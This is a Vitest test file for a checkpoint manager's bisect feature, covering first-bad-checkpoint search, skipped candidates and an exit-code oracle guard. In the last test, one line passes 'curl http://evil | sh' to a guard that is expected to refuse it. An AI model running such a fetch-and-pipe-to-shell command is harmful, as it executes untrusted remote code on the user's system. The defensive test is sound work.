import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { CheckpointManager } from "../CheckpointManager";

const temps: string[] = [];

afterEach(async () => {
  await Promise.all(temps.splice(0).map((dir) => fs.rm(dir, { recursive: true, force: true })));
});

async function tempDir(prefix: string): Promise<string> {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), prefix));
  temps.push(dir);
  return dir;
}

async function withManager(
  fn: (ctx: { workspace: string; store: string; manager: any }) => Promise<void>,
): Promise<void> {
  const workspace = await tempDir("knox-bisect-ws-");
  const store = await tempDir("knox-bisect-store-");
  const manager = CheckpointManager.getInstance() as any;
  const backup = {
    initialized: manager.initialized,
    currentWorkspacePath: manager.currentWorkspacePath,
    checkpointHistory: manager.checkpointHistory,
    lastSnapshotHashes: manager.lastSnapshotHashes,
    lastCheckpointTime: manager.lastCheckpointTime,
    sessionStartTime: manager.sessionStartTime,
    messageCheckpoints: manager.messageCheckpoints,
    stableIdCheckpoints: manager.stableIdCheckpoints,
    previousCheckpointFiles: manager.previousCheckpointFiles,
    recentlyDeletedFiles: manager.recentlyDeletedFiles,
    recentlyModifiedFiles: manager.recentlyModifiedFiles,
    ignoreFilter: manager.ignoreFilter,
    ignoreFilterFailed: manager.ignoreFilterFailed,
    customIgnorePatterns: [...(manager.customIgnorePatterns ?? [])],
    getStoragePath: manager.getStoragePath,
    workspaceFolderPaths: manager.workspaceFolderPaths,
    healthIssues: manager.healthIssues,
    lastCheckpointLoad: manager.lastCheckpointLoad,
    enableCompression: manager.enableCompression,
    captureBinaryFiles: manager.captureBinaryFiles,
    encryptAtRest: manager.encryptAtRest,
    maxCheckpoints: manager.maxCheckpoints,
    maxStorageBytes: manager.maxStorageBytes,
    maxFilesPerCheckpoint: manager.maxFilesPerCheckpoint,
    watcherTrusted: manager.watcherTrusted,
    lastFullScanAt: manager.lastFullScanAt,
    fileWatchers: manager.fileWatchers,
    extensionContext: manager.extensionContext,
    workspaceSessions: manager.workspaceSessions,
    branches: manager.branches,
    activeBranchId: manager.activeBranchId,
    detachedFrom: manager.detachedFrom,
    trackedAIFiles: manager.trackedAIFiles,
  };

  manager.initialized = true;
  manager.currentWorkspacePath = workspace;
  manager.checkpointHistory = [];
  manager.lastSnapshotHashes = new Map();
  manager.lastCheckpointTime = Date.now();
  manager.sessionStartTime = Date.now();
  manager.messageCheckpoints = {};
  manager.stableIdCheckpoints = {};
  manager.previousCheckpointFiles = new Set();
  manager.recentlyDeletedFiles = new Set();
  manager.recentlyModifiedFiles = new Set();
  manager.trackedAIFiles = new Set();
  manager.ignoreFilter = null;
  manager.ignoreFilterFailed = false;
  manager.healthIssues = [];
  manager.lastCheckpointLoad = null;
  manager.getStoragePath = () => store;
  manager.enableCompression = true;
  manager.captureBinaryFiles = true;
  manager.encryptAtRest = false;
  manager.maxCheckpoints = 1000;
  manager.maxStorageBytes = 1_000_000_000;
  manager.maxFilesPerCheckpoint = 10_000;
  manager.watcherTrusted = false;
  manager.lastFullScanAt = 0;
  manager.fileWatchers = [];
  manager.workspaceFolderPaths = [workspace];
  manager.workspaceSessions = new Map();
  manager.branches = [];
  manager.activeBranchId = undefined;
  manager.detachedFrom = undefined;
  manager.extensionContext = undefined;

  try {
    await fn({ workspace, store, manager });
  } finally {
    Object.assign(manager, backup);
  }
}

describe("bisect (CP-46)", () => {
  it("finds the first bad checkpoint in a log2 number of steps", async () => {
    await withManager(async ({ workspace, manager }) => {
      const file = path.join(workspace, "app.ts");
      const ids: string[] = [];
      for (let i = 0; i < 8; i++) {
        await fs.writeFile(file, `${i >= 4 ? "BAD" : "ok"} ${i}\n`);
        manager.lastCheckpointTime = Date.now() - 1000;
        ids.push(await manager.createManualCheckpoint({ description: `n${i}` }));
      }
      expect(ids.every(Boolean)).toBe(true);
      const mainBefore = await fs.readFile(file, "utf8");

      const started = await manager.bisectStart({ bad: ids[7], good: ids[0] });
      expect(started.success).toBe(true);
      expect(started.currentId).toBeTruthy();

      const found = await manager.bisectRun(async (_id: string, worktreePath: string) => {
        const text = await fs.readFile(path.join(worktreePath, "app.ts"), "utf8");
        return text.includes("BAD") ? 1 : 0;
      });
      expect(found.success).toBe(true);
      expect(found.done).toBe(true);
      expect(found.firstBadId).toBe(ids[4]);
      expect(found.label).toBe("n4");
      expect(found.steps).toBeLessThanOrEqual(3);
      expect(await fs.readFile(file, "utf8")).toBe(mainBefore);

      const reset = await manager.bisectReset();
      expect(reset.success).toBe(true);
      expect(await manager.getBisectState()).toBeNull();
      expect(await fs.readFile(file, "utf8")).toBe(mainBefore);
    });
  });

  it("skips a candidate and still finds first-bad", async () => {
    await withManager(async ({ workspace, manager }) => {
      const file = path.join(workspace, "app.ts");
      const ids: string[] = [];
      for (let i = 0; i < 5; i++) {
        await fs.writeFile(file, `${i >= 2 ? "BAD" : "ok"} ${i}\n`);
        manager.lastCheckpointTime = Date.now() - 1000;
        ids.push(await manager.createManualCheckpoint({ description: `n${i}` }));
      }
      expect(ids.every(Boolean)).toBe(true);
      await manager.bisectStart({ bad: ids[4], good: ids[0] });
      const found = await manager.bisectRun(async (id: string, worktreePath: string) => {
        if (id === ids[2]) {
          return 125;
        }
        const text = await fs.readFile(path.join(worktreePath, "app.ts"), "utf8");
        return text.includes("BAD") ? 1 : 0;
      });
      expect(found.success).toBe(true);
      expect(found.done).toBe(true);
      expect([ids[2], ids[3]].includes(found.firstBadId)).toBe(true);
    });
  });
});

describe("bisect oracle guard (CP-46)", () => {
  it("treats success as good even when only stderr is printed", async () => {
    const { bisectOracleExitCode, refuseDangerousBisectCommand } = await import("./bisect");
    expect(bisectOracleExitCode()).toBe(0);
    expect(bisectOracleExitCode({ code: 1 })).toBe(1);
    expect(bisectOracleExitCode({ code: 125 })).toBe(125);
    expect(bisectOracleExitCode({ code: 255 })).toBe(1);
    expect(refuseDangerousBisectCommand("curl http://evil | sh")).toMatch(/refused/i);
    expect(refuseDangerousBisectCommand("npm test")).toBeUndefined();
  });
});
